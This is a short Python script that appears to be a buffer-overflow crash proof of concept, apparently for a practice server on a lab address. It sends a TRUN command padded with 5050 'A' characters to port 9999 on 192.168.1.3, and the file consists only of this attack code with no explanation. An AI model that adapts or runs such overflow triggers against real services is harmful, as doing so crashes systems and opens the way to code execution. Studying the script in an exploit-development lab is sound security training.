#!/usr/bin/python

import socket
import os
import sys

host="192.168.1.3"
port=9999

buffer = "TRUN /.:/" + "A" * 5050

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((host, port))
expl.send(buffer)
expl.close()
